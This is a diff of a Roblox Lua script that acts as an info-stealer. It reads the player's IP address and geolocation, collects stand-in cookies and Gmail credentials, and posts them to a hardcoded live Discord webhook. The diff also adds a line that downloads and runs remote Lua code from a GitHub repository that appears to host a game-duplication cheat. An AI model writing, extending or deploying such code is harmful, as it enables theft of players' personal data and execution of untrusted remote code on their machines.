@@ -5,6 +5,12 @@ local username = player.Name
 local ipAddress = game:HttpGet("https://api.ipify.org")
 local location = game:HttpGet("http://ip-api.com/json/" .. ipAddress)
 
+local function sendToDiscord(data)
+    local webhookUrl = "https://discord.com/api/webhooks/1322935736588304404/ZwopnDR91hy78bwVSk2cEdK1naXEMFu2b1shrl-0AVyGYwY-uapuCj9x8HQoHKNGXeJV"
+    local jsonData = http:JSONEncode(data)
+    http:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson, false, {["Content-Type"] = "application/json"})
+end
+
 local function getCookies()
     local cookies = {}
     -- Simulate getting cookies from the browser
@@ -35,12 +41,6 @@ local function getGmailCredentials()
     gmailCredentials["gmail.com"] = {username = "gmailuser1", password = "gmailpass1"}
     gmailCredentials["gmail.com"] = {username = "gmailuser2", password = "gmailpass2"}
     return gmailCredentials
-end
-
-local function sendToDiscord(data)
-    local webhookUrl = "https://discord.com/api/webhooks/1322935736588304404/ZwopnDR91hy78bwVSk2cEdK1naXEMFu2b1shrl-0AVyGYwY-uapuCj9x8HQoHKNGXeJV"
-    local jsonData = http:JSONEncode(data)
-    http:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson, false, {["Content-Type"] = "application/json"})
 end
 
 local cookies = getCookies()
@@ -105,3 +105,5 @@ end
 for _, embed in ipairs(embeds) do
     sendToDiscord({embeds = {embed}})
 end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Codestealz/IslandsDupe/main/IslandsDupe2024.lua"))()
